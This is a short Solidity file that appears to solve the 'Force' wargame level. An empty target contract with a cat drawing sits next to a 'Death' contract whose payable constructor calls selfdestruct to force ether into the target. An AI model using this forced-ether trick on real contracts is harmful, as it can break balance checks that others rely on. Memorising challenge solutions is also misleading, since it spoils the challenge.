// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}

contract Death{

    constructor(address force_contract) public payable {
        address payable fc = payable(address(force_contract));
        selfdestruct(fc);
    }

}